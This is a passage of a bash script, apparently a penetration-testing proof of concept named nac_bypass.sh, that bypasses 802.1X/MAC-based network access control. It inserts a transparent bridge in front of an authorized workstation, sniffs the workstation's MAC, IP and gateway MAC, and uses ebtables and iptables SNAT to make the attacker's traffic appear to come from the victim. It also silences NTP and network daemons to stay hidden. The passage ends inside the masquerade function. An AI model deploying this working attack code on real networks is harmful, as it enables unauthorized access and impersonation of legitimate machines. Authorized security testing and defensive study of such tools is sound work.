#!/bin/bash
#==============================================================================
# nac_bypass.sh - Transparent-bridge NAC bypass POC (v4.0)
#
# Authorized internal pen-testing tool. Inserts the host between an authorized
# workstation and its switch port. The workstation's 802.1X / MAC-auth session
# stays alive THROUGH the bridge; the host injects its own traffic so that on
# the wire it appears to come from the workstation, and reply traffic is
# pulled back into the host's stack (not bridged on to the workstation).
#
# How the model works (top-to-bottom):
#
#     [ Workstation ] <-- eth_comp -- [ br0 ] -- eth_sw --> [ Switch / Phone ]
#                                       |
#                                  [ Local stack ]
#                                  src 169.254.66.66
#                                       |
#                                  iptables SNAT  -> COMIP:port
#                                  ebtables SNAT  -> COMPMAC (egress eth_sw)
#                                  conntrack tracks return flows
#
# On outbound: locally-generated frames egress br0, get SNAT'd at L3 to the
# workstation's IP and at L2 to the workstation's MAC, then go out the switch
# side. They look indistinguishable from the workstation's own traffic.
#
# On return: replies arrive on the switch side with dst = workstation. Bridge
# netfilter hooks fire; conntrack reverse-NATs the destination back to our
# bridge IP. The kernel re-routes to the local stack instead of bridging on.
# The workstation never sees the reply.
#
# This script is intentionally minimal: it builds the bridge, learns the
# identities (or accepts them from the operator), installs masquerade, prints
# a banner, and waits. Ctrl+C cleans everything up. No Responder / SSH /
# port-forwarding - run those tools yourself in a second terminal.
#==============================================================================

set -u
set -o pipefail

VERSION="4.0"
SCRIPT_NAME="$(basename "$0")"

#==============================================================================
# Configuration
#==============================================================================
BRINT="br0"                     # bridge name
SWINT=""                        # NIC plugged into switch / phone
COMPINT=""                      # NIC plugged into workstation

# Bridge link-local subnet. Anything inside 169.254.0.0/16 works; we pick a
# /24 we never expect to see in the real network.
BRIP="169.254.66.66"
BRGW="169.254.66.1"
BRMASK="24"

# High port range for L3 SNAT. Above default ip_local_port_range on Linux
# (32768-60999) and on Windows, so collision with the workstation's own
# outbound flows is unlikely.
SNAT_RANGE="61000-65000"

# Passive-learning timeout. 60s is enough for an active workstation to
# emit at least one TCP SYN or ARP request.
LEARN_TIMEOUT=60

# State directory. Every change we make leaves a marker here so cleanup
# reverses ONLY what we touched.
STATE_DIR="/run/nac_bypass"
[ -d /run ] || STATE_DIR="/tmp/nac_bypass"
RUN_LOG=""

# Dedicated chains - bypass rules go here so cleanup never flushes the
# operator's unrelated NAT setup.
NAC_NAT_CHAIN="NAC_BYPASS"
NAC_EBT_CHAIN="NAC_BYPASS"

# CLI flags
OPT_VERBOSE=0
OPT_RESET_ONLY=0
GWMAC_USER=""
GWIP_USER=""
COMPMAC_USER=""
COMIP_USER=""

# Resolved at runtime
SWMAC=""
COMPMAC=""
COMIP=""
GWMAC=""
GWIP=""

CMD_IP=""
CMD_IPTABLES=""
CMD_EBTABLES=""
CMD_TCPDUMP=""
CMD_NMCLI=""

INITIALISED=0
CONN_ACTIVE=0
TRAP_INSTALLED=0
RESET_DONE=0

#==============================================================================
# Logging
#==============================================================================
_log() {
    local level=$1; shift
    local color='' reset='\e[0m'
    case "$level" in
        DEBUG) [ "$OPT_VERBOSE" -eq 0 ] && return 0; color='\e[0;36m' ;;
        INFO)  color='\e[1;34m' ;;
        WARN)  color='\e[1;33m' ;;
        ERR)   color='\e[1;31m' ;;
        OK)    color='\e[1;32m' ;;
    esac
    local ts; ts="$(date +'%F %T')"
    printf '%b[%s] [%-4s] %s%b\n' "$color" "$ts" "$level" "$*" "$reset"
    if [ -n "$RUN_LOG" ] && [ -e "$RUN_LOG" ]; then
        printf '[%s] [%-4s] %s\n' "$ts" "$level" "$*" >> "$RUN_LOG" 2>/dev/null || true
    fi
}
log()   { _log INFO  "$@"; }
warn()  { _log WARN  "$@"; }
err()   { _log ERR   "$@"; }
ok()    { _log OK    "$@"; }
debug() { _log DEBUG "$@"; }
die()   { err "$@"; cleanup_on_error; exit 1; }

#==============================================================================
# State directory
#==============================================================================
state_init() {
    mkdir -p "$STATE_DIR" 2>/dev/null || die "Cannot create state dir $STATE_DIR"
    chmod 700 "$STATE_DIR"
    RUN_LOG="$STATE_DIR/run.log"
    : > "$RUN_LOG"
}
state_set()   { echo "$2" > "$STATE_DIR/$1"; }
state_get()   { cat "$STATE_DIR/$1" 2>/dev/null || echo ""; }
state_clear() { rm -rf "$STATE_DIR"; RUN_LOG=""; }

#==============================================================================
# Helpers
#==============================================================================
resolve_bin() { command -v "$1" 2>/dev/null || true; }
has_iface()   { [ -d "/sys/class/net/$1" ]; }
iface_carrier() { cat "/sys/class/net/$1/carrier" 2>/dev/null || echo 0; }
iface_mac()     { cat "/sys/class/net/$1/address" 2>/dev/null; }
iface_master() {
    local link="/sys/class/net/$1/master"
    [ -e "$link" ] || return 1
    basename "$(readlink -f "$link")"
}

is_valid_mac() {
    [[ "$1" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] \
        && [[ "$1" != "ff:ff:ff:ff:ff:ff" ]] \
        && [[ "$1" != "00:00:00:00:00:00" ]]
}

is_valid_ip() {
    [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
    local IFS=. a b c d
    read -r a b c d <<<"$1"
    [ "$a" -le 255 ] && [ "$b" -le 255 ] && [ "$c" -le 255 ] && [ "$d" -le 255 ]
}

# Reject IPs that cannot be a usable workstation identity (ARP probe zero,
# APIPA, loopback, multicast, broadcast).
is_useful_victim_ip() {
    is_valid_ip "$1" || return 1
    local IFS=. a b c d
    read -r a b c d <<<"$1"
    [ "$a" -eq 0 ]                       && return 1
    [ "$a" -eq 127 ]                     && return 1
    [ "$a" -eq 169 ] && [ "$b" -eq 254 ] && return 1
    [ "$a" -ge 224 ]                     && return 1
    [ "$1" = "255.255.255.255" ]         && return 1
    return 0
}

is_uint() { [[ "$1" =~ ^[0-9]+$ ]]; }

read_sysctl()  { local p="/proc/sys/${1//.//}"; [ -r "$p" ] && cat "$p" 2>/dev/null || echo ""; }
write_sysctl() { local p="/proc/sys/${1//.//}"; [ -w "$p" ] && echo "$2" > "$p" 2>/dev/null; }

#==============================================================================
# Pre-flight validation
#==============================================================================
preflight() {
    log "Pre-flight validation..."

    # Binaries
    CMD_IP=$(resolve_bin ip)
    CMD_TCPDUMP=$(resolve_bin tcpdump)
    CMD_EBTABLES=$(resolve_bin ebtables)
    CMD_IPTABLES=$(resolve_bin iptables)
    CMD_NMCLI=$(resolve_bin nmcli)

    local missing=()
    [ -z "$CMD_IP" ]       && missing+=("ip (iproute2)")
    [ -z "$CMD_TCPDUMP" ]  && missing+=("tcpdump")
    [ -z "$CMD_EBTABLES" ] && missing+=("ebtables")
    [ -z "$CMD_IPTABLES" ] && missing+=("iptables")
    if [ ${#missing[@]} -gt 0 ]; then
        err "Missing required tools:"
        for m in "${missing[@]}"; do err "  - $m"; done
        die "Install: apt-get install iproute2 tcpdump ebtables iptables"
    fi
    debug "Binaries: ip=$CMD_IP iptables=$CMD_IPTABLES ebtables=$CMD_EBTABLES tcpdump=$CMD_TCPDUMP"

    # Kernel: bridge type works (uses correct iproute2 argument order)
    "$CMD_IP" link del __nactest__ 2>/dev/null || true
    if ! "$CMD_IP" link add name __nactest__ type bridge 2>/dev/null; then
        modprobe bridge 2>/dev/null \
            || die "Bridge support unavailable. Enable CONFIG_BRIDGE in the kernel."
        "$CMD_IP" link add name __nactest__ type bridge 2>/dev/null \
            || die "Bridge module loaded but bridge creation still fails."
    fi
    "$CMD_IP" link del __nactest__ 2>/dev/null || true

    # br_netfilter MUST be present, else conntrack reverse-NAT does nothing
    if [ ! -e /proc/sys/net/bridge/bridge-nf-call-iptables ]; then
        modprobe br_netfilter 2>/dev/null || true
    fi
    [ -e /proc/sys/net/bridge/bridge-nf-call-iptables ] \
        || die "br_netfilter is not available. Without it, reply traffic NAT cannot work."

    # nf_conntrack MUST be present for return-traffic NAT
    modprobe nf_conntrack 2>/dev/null || true
    [ -e /proc/net/nf_conntrack ] \
        || die "nf_conntrack is not available. SNAT cannot reverse return traffic without it."

    # Interfaces specified?
    [ -z "$SWINT" ]   && die "Switch-side interface not specified. Use -1 <iface>."
    [ -z "$COMPINT" ] && die "Workstation-side interface not specified. Use -2 <iface>."
    [ "$SWINT" = "$COMPINT" ] && die "-1 and -2 cannot be the same interface."

    # Interfaces exist
    has_iface "$SWINT"   || die "Interface '$SWINT' not found (-1)."
    has_iface "$COMPINT" || die "Interface '$COMPINT' not found (-2)."

    # Interfaces have a link (both must be up - otherwise we are wasting time)
    local sw_c comp_c
    sw_c=$(iface_carrier "$SWINT")
    comp_c=$(iface_carrier "$COMPINT")
    if [ "$sw_c" != "1" ] || [ "$comp_c" != "1" ]; then
        err "Link state problem:"
        err "  $SWINT (switch side)       carrier=$sw_c   $( [ "$sw_c" = "1" ] && echo OK || echo "DOWN - check cable to switch/phone")"
        err "  $COMPINT (workstation side) carrier=$comp_c   $( [ "$comp_c" = "1" ] && echo OK || echo "DOWN - check cable to workstation")"
        die "Both NICs must have an active link before starting."
    fi
    debug "Both NICs have link: $SWINT carrier=$sw_c, $COMPINT carrier=$comp_c"

    # Interfaces not already enslaved to something else
    local m
    if m=$(iface_master "$SWINT")   && [ "$m" != "$BRINT" ]; then
        die "$SWINT is already in bridge '$m'. Detach it first."
    fi
    if m=$(iface_master "$COMPINT") && [ "$m" != "$BRINT" ]; then
        die "$COMPINT is already in bridge '$m'. Detach it first."
    fi

    if has_iface "$BRINT"; then
        warn "Bridge '$BRINT' already exists - will tear down and recreate."
    fi

    ok "Pre-flight checks passed."
}

#==============================================================================
# Host lockdown - quiet the box so it doesn't leak its real identity, and
# enable the kernel features the bypass depends on. Every change records
# state so cleanup is exact.
#==============================================================================
host_lockdown() {
    log "Hardening host network state..."

    # Mark NICs unmanaged so NM can't fight us if it restarts mid-run
    if [ -n "$CMD_NMCLI" ]; then
        : > "$STATE_DIR/nmcli_unmanaged"
        for iface in "$SWINT" "$COMPINT"; do
            if "$CMD_NMCLI" device set "$iface" managed no 2>/dev/null; then
                echo "$iface" >> "$STATE_DIR/nmcli_unmanaged"
            fi
        done
    fi

    # Stop network management daemons
    : > "$STATE_DIR/services_stopped"
    for svc in NetworkManager.service systemd-networkd.service wpa_supplicant.service; do
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            systemctl stop "$svc" 2>/dev/null && echo "$svc" >> "$STATE_DIR/services_stopped"
        fi
    done

    # Stop NTP - it would broadcast and leak the host's existence
    : > "$STATE_DIR/ntp_stopped"
    for svc in ntp.service ntpsec.service chronyd.service systemd-timesyncd.service; do
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            systemctl stop "$svc" 2>/dev/null && echo "$svc" >> "$STATE_DIR/ntp_stopped"
        fi
    done
    timedatectl set-ntp false 2>/dev/null || true

    # Kernel settings (recorded for restore)
    state_set "ipv6_disable_all"  "$(read_sysctl net.ipv6.conf.all.disable_ipv6)"
    write_sysctl net.ipv6.conf.all.disable_ipv6 1 || true

    state_set "br_nf_call_ipt"    "$(read_sysctl net.bridge.bridge-nf-call-iptables)"
    write_sysctl net.bridge.bridge-nf-call-iptables 1 \
        || die "Cannot enable bridge-nf-call-iptables; bypass cannot work."

    state_set "ip_forward"        "$(read_sysctl net.ipv4.ip_forward)"
    write_sysctl net.ipv4.ip_forward 1 \
        || die "Cannot enable ip_forward; bypass cannot work."

    state_set "icmp_ignore_bcast" "$(read_sysctl net.ipv4.icmp_echo_ignore_broadcasts)"
    write_sysctl net.ipv4.icmp_echo_ignore_broadcasts 1 || true

    # Snapshot existing default routes so cleanup can restore them
    "$CMD_IP" -4 route show default 2>/dev/null > "$STATE_DIR/default_routes.bak" || true

    debug "Host lockdown complete."
}

#==============================================================================
# Bridge construction.
#
# Critical details:
#   - STP off and forward_delay=0  -> bridge forwards from the very first
#     frame. The default 30-second STP listening/learning phase would silently
#     kill 802.1X auth, since EAPOL frames would be dropped during it.
#   - group_fwd_mask=8 lets EAPOL (01:80:c2:00:00:03) traverse the bridge.
#     Linux bridges drop the 802.1D reserved multicast range by default.
#   - Slaves are enslaved WITHOUT `ip link set down`. Bringing them down
#     bounces the link, which on 802.1X switches triggers re-authentication.
#     Re-auth puts the workstation port in unauthorized state and breaks DHCP.
#==============================================================================
bridge_create() {
    log "Creating transparent bridge $BRINT ($SWINT <-> $COMPINT)..."

    # Remove any stale bridge
    if has_iface "$BRINT"; then
        "$CMD_IP" link set "$BRINT" down 2>/dev/null || true
        "$CMD_IP" link del "$BRINT" 2>/dev/null || true
    fi

    "$CMD_IP" link add name "$BRINT" type bridge stp_state 0 forward_delay 0 \
        || die "Failed to create bridge $BRINT."
    state_set "bridge_owned" "1"
    state_set "bridge_name"  "$BRINT"
    state_set "swint"        "$SWINT"
    state_set "compint"      "$COMPINT"

    # Force MTU 1500 - prevents an unexpectedly small slave MTU (PPPoE,
    # tunneled NIC, etc.) from breaking EAP-TLS fragment exchange or
    # full-size frames the workstation expects.
    "$CMD_IP" link set "$BRINT" mtu 1500 2>/dev/null || true

    # Enable EAPOL forwarding (bit 3 of group_fwd_mask = 01:80:c2:00:00:03,
    # the PAE multicast address). Without this the Linux bridge silently
    # drops all 802.1X frames and the workstation never re-authenticates.
    if [ -e "/sys/class/net/$BRINT/bridge/group_fwd_mask" ]; then
        echo 8 > "/sys/class/net/$BRINT/bridge/group_fwd_mask" 2>/dev/null \
            || warn "Could not enable EAPOL forwarding via group_fwd_mask."
    fi

    # Bring the bridge UP *before* enslaving slaves. Once a slave is
    # attached to an already-up bridge, frames are forwardable the instant
    # the second slave joins - no window where the bridge is admin-DOWN
    # while frames are arriving. Critical for 802.1X (especially PEAP-
    # MSCHAPv2 TLS fragments, which retransmit slowly on drop).
    "$CMD_IP" link set "$BRINT" promisc on
    "$CMD_IP" link set "$BRINT" up

    # Install egress lock NOW. Bridge is up but has no slaves, so no frames
    # can flow yet anyway, but the lock guards any locally-generated frame
    # that would route via br0 during enslavement.
    install_egress_lock

    # Mark the bridge itself NM-unmanaged. If NetworkManager restarts mid-
    # session (a common operator habit on a Kali host), it must not try to
    # take over br0 and reconfigure it.
    if [ -n "$CMD_NMCLI" ]; then
        if "$CMD_NMCLI" device set "$BRINT" managed no 2>/dev/null; then
            echo "$BRINT" >> "$STATE_DIR/nmcli_unmanaged"
        fi
    fi

    # Enslave SWINT first - the Linux bridge auto-inherits the first slave's
    # MAC as its own. Doing SWINT first means the bridge ends up with the
    # switch-side NIC's MAC, which is what we want our ebtables `-s SWMAC`
    # rule to match. We then read the bridge MAC back rather than assuming.
    for iface in "$SWINT" "$COMPINT"; do
        "$CMD_IP" addr flush dev "$iface" >/dev/null 2>&1
        "$CMD_IP" link set "$iface" master "$BRINT" || die "Failed to enslave $iface to $BRINT."
        "$CMD_IP" link set "$iface" promisc on      || die "Failed to enable promisc on $iface."
        "$CMD_IP" link set "$iface" up              || die "Failed to bring $iface up."
    done

    # Read the bridge's actual MAC and use that as SWMAC for the ebtables
    # rewrite rule. This is more robust than asserting it should equal
    # SWINT's MAC: if for any reason the kernel chose a different MAC, our
    # rule still matches what's actually on the wire.
    SWMAC=$(iface_mac "$BRINT")
    is_valid_mac "$SWMAC" || die "Bridge $BRINT does not have a valid MAC after enslavement."
    debug "Bridge MAC = $SWMAC (inherited from first slave $SWINT)"

    INITIALISED=1
    ok "Bridge $BRINT is live (silent; egress locked until masquerade is armed)."
}

#==============================================================================
# Egress lock - prevents the host from emitting any packet on the bridge
# while we're still configuring NAT. Lifts as soon as install_masquerade
# completes.
#==============================================================================
install_egress_lock() {
    "$CMD_IPTABLES" -I OUTPUT 1 -o "$BRINT" -j DROP 2>/dev/null || true
    state_set "egress_locked" "1"
}
remove_egress_lock() {
    "$CMD_IPTABLES" -D OUTPUT -o "$BRINT" -j DROP 2>/dev/null || true
    rm -f "$STATE_DIR/egress_locked"
}

#==============================================================================
# Passive learning
#
# We need three values to install masquerade:
#   COMPMAC  - workstation's MAC          (so frames on the wire bear it)
#   COMIP    - workstation's IP           (so SNAT rewrites our src IP to it)
#   GWMAC    - workstation's gateway MAC  (so frames hit the static neighbor)
#
# GWIP is informational only (banner). We never use it operationally; the
# kernel sends frames to the fictional BRGW=169.254.66.1 whose static neigh
# entry maps to GWMAC.
#
# Primary channel: ANY unicast IPv4 frame leaving the workstation. Captured
# with `-Q in` on COMPINT so direction is unambiguous (src=workstation,
# dst=next-hop=gateway). Broadcast/multicast (mDNS, NBNS, SSDP) is filtered
# out at capture time so we don't pick up frames without a useful gateway
# MAC in the dst_mac field. This catches TCP SYNs, TCP retransmits, UDP
# DNS, ICMP, anything - whatever the workstation emits first.
#
# Secondary channel: ARP request from the workstation. The L2 src plus the
# `tell <ip>` field reveal COMPMAC/COMIP; the `who-has <ip>` field reveals
# GWIP, and a matching ARP Reply gives us GWMAC.
#==============================================================================
learn() {
    # Operator-pinned fast path
    if is_valid_mac "$COMPMAC_USER" && is_useful_victim_ip "$COMIP_USER" \
       && is_valid_mac "$GWMAC_USER"; then
        COMPMAC="$COMPMAC_USER"
        COMIP="$COMIP_USER"
        GWMAC="$GWMAC_USER"
        GWIP="${GWIP_USER:-}"
        ok "Using operator-pinned identity (no passive learning needed)."
        ok "  victim   $COMPMAC / $COMIP"
        ok "  gateway  $GWMAC / ${GWIP:-unknown}"
        return 0
    fi

    local ip_pcap="$STATE_DIR/learn_ip.pcap"
    local arp_pcap="$STATE_DIR/learn_arp.pcap"
    rm -f "$ip_pcap" "$arp_pcap"

    log "Listening on $COMPINT for victim/gateway traffic (up to ${LEARN_TIMEOUT}s)..."
    log "If the workstation is idle, generate any outbound traffic (a web request,"
    log "a DNS lookup, anything) - the first unicast IP frame is enough."

    # Primary: any unicast IPv4 frame egressing the workstation. Catches TCP
    # SYN, TCP retransmits, UDP (DNS lookups, etc.), ICMP, anything. Direction
    # is `in` on COMPINT so we know src=workstation and dst=next-hop.
    # `not ether broadcast and not ether multicast` excludes mDNS/NBNS/SSDP
    # noise that wouldn't give us a gateway MAC.
    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -Q in -nn -e -s 96 -c 1 \
        -w "$ip_pcap" 'ip and not ether broadcast and not ether multicast' >/dev/null 2>&1 &
    local ip_pid=$!

    # Secondary: ARP (up to 10 frames for request+reply coverage)
    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -Q in -nn -e -p -s 0 -c 10 \
        -w "$arp_pcap" 'arp' >/dev/null 2>&1 &
    local arp_pid=$!

    wait_any "$ip_pid" "$arp_pid" >/dev/null
    sleep 2   # give the other capture a beat to fill in detail
    kill "$ip_pid" "$arp_pid" 2>/dev/null || true
    wait 2>/dev/null || true

    # Seed with any operator-pinned values so the parser can fill the rest
    COMPMAC="$COMPMAC_USER"
    COMIP="$COMIP_USER"
    GWMAC="$GWMAC_USER"
    GWIP="$GWIP_USER"

    parse_ip  "$ip_pcap"  && debug "Learned via IP frame"
    parse_arp "$arp_pcap" && debug "Learned via ARP"

    # Validate
    local missing=()
    is_valid_mac "$COMPMAC"      || missing+=("workstation MAC")
    is_useful_victim_ip "$COMIP" || missing+=("workstation IP")
    is_valid_mac "$GWMAC"        || missing+=("gateway MAC")

    if [ ${#missing[@]} -eq 0 ]; then
        ok "Learned identity:"
        ok "  victim   $COMPMAC / $COMIP"
        ok "  gateway  $GWMAC / ${GWIP:-unknown}"
        return 0
    fi

    learn_failure_report "${missing[@]}"
    return 1
}

learn_failure_report() {
    local missing=("$@")
    err "Did not learn a complete identity in ${LEARN_TIMEOUT}s."
    err "What we have:"
    err "  workstation mac : $( is_valid_mac "$COMPMAC"      && echo "$COMPMAC [OK]" || echo "${COMPMAC:-?} [MISSING]")"
    err "  workstation ip  : $( is_useful_victim_ip "$COMIP" && echo "$COMIP [OK]"   || echo "${COMIP:-?} [MISSING]")"
    err "  gateway mac     : $( is_valid_mac "$GWMAC"        && echo "$GWMAC [OK]"   || echo "${GWMAC:-?} [MISSING]")"
    err "  gateway ip      : $( is_valid_ip "$GWIP"          && echo "$GWIP [info]"  || echo "${GWIP:-?} [info]")"

    # Common-case diagnostics
    if [[ "$COMIP" =~ ^169\.254\. ]]; then
        err ""
        err "Workstation IP is APIPA (169.254.x.x). It has no real DHCP lease."
        err "Most likely 802.1X is unauthenticated. Wait 60-120s for the supplicant"
        err "to re-auth and renew DHCP, then re-run the script."
    elif [ "$COMIP" = "0.0.0.0" ]; then
        err ""
        err "Captured an ARP Probe (sender=0.0.0.0). Workstation has not finished"
        err "configuring its IP. Wait and retry."
    elif is_valid_ip "$GWIP" && ! is_valid_mac "$GWMAC"; then
        err ""
        err "We know the gateway IP ($GWIP) but never saw its MAC. Likely cause:"
        err "the switch-side link is down or the gateway is silent. On the"
        err "WORKSTATION itself run:"
        err "    arp -a | findstr $GWIP                  (Windows)"
        err "    ip neigh | grep $GWIP                    (Linux/Mac)"
        err "Then re-run with the gateway MAC pinned via -g."
    fi

    err ""
    err "To pin missing values manually:"
    err "  -V <workstation_mac>  -W <workstation_ip>"
    err "  -g <gateway_mac>      -G <gateway_ip>"
}

# wait_any: returns when any of the listed PIDs has exited.
wait_any() {
    local pids=("$@")
    while :; do
        local p
        for p in "${pids[@]}"; do
            if ! kill -0 "$p" 2>/dev/null; then
                echo "$p"; return 0
            fi
        done
        sleep 0.2
    done
}

# parse_ip: extract identity from any unicast IPv4 frame leaving the
# workstation. Because direction is `in` on COMPINT and we excluded
# broadcast/multicast at capture time:
#     src_mac = workstation MAC
#     dst_mac = next-hop MAC (gateway for off-subnet destinations)
#     src_ip  = workstation IP
# Works equally well for TCP SYN, TCP retransmits, UDP DNS, UDP NetBIOS
# unicast, ICMP, etc. - whichever the workstation happens to emit first.
parse_ip() {
    local pcap=$1
    [ -s "$pcap" ] || return 1
    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1

    local line
    line=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null | head -1)
    [ -z "$line" ] && return 1
    debug "IP frame: $line"

    # `tcpdump -nn -e` format for IPv4:
    #   HH:MM:SS.NNN src_mac > dst_mac, ethertype IPv4 (0x0800), length L:
    #   src_ip(.port)? > dst_ip(.port)?: <proto-specific>
    # Fields 2/4/10 stay the same across TCP/UDP/ICMP because IPv4 wrapping
    # is identical; only the trailing protocol decode differs.
    local s_mac d_mac s_ip
    s_mac=$(awk '{print $2}' <<<"$line")
    d_mac=$(awk '{gsub(/,$/,"",$4); print $4}' <<<"$line")
    s_ip=$(awk '{print $10}' <<<"$line" | awk -F. '{print $1"."$2"."$3"."$4}')

    is_valid_mac "$s_mac" || return 1
    is_valid_mac "$d_mac" || return 1
    is_valid_ip  "$s_ip"  || return 1

    [ -z "$COMPMAC" ] && COMPMAC="$s_mac"
    [ -z "$COMIP"   ] && COMIP="$s_ip"
    [ -z "$GWMAC"   ] && GWMAC="$d_mac"
    return 0
}

# parse_arp: extract workstation identity from a Request and the gateway's
# MAC from the matching Reply. RFC-5227 ARP Probes (tell 0.0.0.0) are
# explicitly skipped - they don't carry workstation IP.
parse_arp() {
    local pcap=$1
    [ -s "$pcap" ] || return 1
    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1

    local lines vmac="" vip="" gmac="" gip="" target_ip=""
    lines=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null)
    [ -z "$lines" ] && return 1

    debug "ARP frames:"
    while IFS= read -r l; do debug "  $l"; done <<<"$lines"

    # Pass 1: find a Request with a real sender IP
    while IFS= read -r line; do
        if [[ "$line" =~ Request[[:space:]]who-has[[:space:]]([0-9.]+) ]]; then
            target_ip="${BASH_REMATCH[1]}"
        fi
        if [[ "$line" =~ tell[[:space:]]([0-9.]+) ]]; then
            local cand="${BASH_REMATCH[1]}"
            if [ "$cand" = "0.0.0.0" ]; then
                debug "  (skip ARP Probe: $line)"
                continue
            fi
            vip="$cand"
            vmac=$(awk '{print $2}' <<<"$line")
        fi
        [ -n "$vmac" ] && [ -n "$vip" ] && [ -n "$target_ip" ] && break
    done <<<"$lines"

    # Pass 2: matching Reply for target_ip
    if [ -n "$target_ip" ]; then
        local esc=${target_ip//./\\.}
        while IFS= read -r line; do
            if [[ "$line" =~ Reply[[:space:]]${esc}[[:space:]]is-at ]]; then
                gmac=$(awk '{print $2}' <<<"$line")
                gip="$target_ip"
                break
            fi
        done <<<"$lines"
    fi

    # Merge with whatever's already set (SYN parser may have filled some)
    [ -z "$COMPMAC" ] && is_valid_mac "$vmac" && COMPMAC="$vmac"
    [ -z "$COMIP"   ] && is_valid_ip  "$vip"  && COMIP="$vip"
    [ -z "$GWMAC"   ] && is_valid_mac "$gmac" && GWMAC="$gmac"
    [ -z "$GWIP"    ] && is_valid_ip  "$gip"  && GWIP="$gip"
    # Even without a Reply, expose the target IP as the gateway IP candidate
    [ -z "$GWIP"    ] && is_valid_ip  "$target_ip" && GWIP="$target_ip"

    return 0
}

#==============================================================================
# Masquerade rules
#
# $SWMAC here = the BRIDGE's MAC (auto-inherited from SWINT when SWINT was
# enslaved first). Locally-generated frames egress br0 with src_mac=SWMAC,
# which is what the three ebtables rules below key on.
#
# L2 (ebtables, NAC_BYPASS chain off POSTROUTING):
#   1. -s SWMAC -o SWINT   -j snat --to-src COMPMAC   (toward switch)
#   2. -s SWMAC -o BRINT   -j snat --to-src COMPMAC   (sanity)
#   3. -s SWMAC -o COMPINT -j snat --to-src GWMAC     (toward workstation)
#
# Workstation traffic is unaffected because its src_mac is COMPMAC, not SWMAC.
# Switch reply traffic is unaffected because its src_mac is GWMAC, not SWMAC.
#
# L3 (iptables, NAC_BYPASS chain off POSTROUTING):
#   1. -o BRINT -s BRIP -p tcp  -j SNAT --to COMIP:RANGE  --random-fully
#   2. -o BRINT -s BRIP -p udp  -j SNAT --to COMIP:RANGE  --random-fully
#   3. -o BRINT -s BRIP -p icmp -j SNAT --to COMIP
#
# Plus:
#   - Static neighbor entry pinning BRGW=169.254.66.1 -> GWMAC on BRINT
#     (so the kernel never has to ARP for the fictional bridge gateway)
#   - Default route: default via BRGW dev BRINT metric 0
#   - The bridge gets address BRIP/$BRMASK so it can source traffic
#==============================================================================
install_masquerade() {
    log "Installing masquerade rules..."
    log "  victim   $COMPMAC / $COMIP"
    log "  gateway  $GWMAC / ${GWIP:-unknown}"

    # Address the bridge
    "$CMD_IP" addr add "$BRIP/$BRMASK" dev "$BRINT" 2>/dev/null \
        || "$CMD_IP" -4 addr show dev "$BRINT" | grep -q "$BRIP" \
        || die "Failed to assign $BRIP to $BRINT."

    # ----- Named chains (so cleanup never flushes operator's rules) ----------
    # iptables nat
    "$CMD_IPTABLES" -t nat -N "$NAC_NAT_CHAIN" 2>/dev/null \
        || "$CMD_IPTABLES" -t nat -F "$NAC_NAT_CHAIN"
    "$CMD_IPTABLES" -t nat -C POSTROUTING -j "$NAC_NAT_CHAIN" 2>/dev/null \
        || "$CMD_IPTABLES" -t nat -A POSTROUTING -j "$NAC_NAT_CHAIN"

    # ebtables nat
    "$CMD_EBTABLES" -t nat -N "$NAC_EBT_CHAIN" 2>/dev/null \
        || "$CMD_EBTABLES" -t nat -F "$NAC_EBT_CHAIN"
    if ! "$CMD_EBTABLES" -t nat -L POSTROUTING 2>/dev/null | grep -q -- "-j $NAC_EBT_CHAIN"; then
        "$CMD_EBTABLES" -t nat -A POSTROUTING -j "$NAC_EBT_CHAIN"
    fi
    state_set "chains_installed" "1"

    # ----- L2 SNAT (3 rules) -------------------------------------------------
    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_CHAIN" -s "$SWMAC" -o "$SWINT"   -j snat --to-src "$COMPMAC"
    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_CHAIN" -s "$SWMAC" -o "$BRINT"   -j snat --to-src "$COMPMAC"
    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_CHAIN" -s "$SWMAC" -o "$COMPINT" -j snat --to-src "$GWMAC"

    # ----- Static neighbor for the fictional bridge gateway -----------------
    "$CMD_IP" neigh replace "$BRGW" lladdr "$GWMAC" dev "$BRINT" nud permanent \
        || die "Failed to install static neighbor $BRGW -> $GWMAC."
    state_set "neigh_static" "$BRGW"

    # ----- Default route (additive, never destroys operator's mgmt route) ----
    if "$CMD_IP" route add default via "$BRGW" dev "$BRINT" metric 0 2>/dev/null; then
        state_set "route_default_added" "1"
    else
        warn "Could not add default route via $BRINT at metric 0 (collision)."
        warn "Tools may egress the wrong NIC. Pin them with -e/-S flags or use -m."
    fi

    # ----- L3 SNAT (3 rules) -------------------------------------------------
    # `--random-fully` (kernel >= 3.13) shuffles the source port allocation
    # so our SNAT'd flows are less likely to collide with whatever the
    # workstation happens to be using from its own ephemeral range. We try
    # it first and fall back to the plain SNAT for ancient iptables.
    if ! "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p tcp \
            -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null; then
        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p tcp \
            -j SNAT --to "$COMIP:$SNAT_RANGE"
    fi
    if ! "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p udp \
            -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null; then
        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p udp \
            -j SNAT --to "$COMIP:$SNAT_RANGE"
    fi
    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p icmp \
        -j SNAT --to "$COMIP"

    # Lift the egress lock now that NAT is in place
    remove_egress_lock

    CONN_ACTIVE=1
    state_set "masquerade_active" "1"
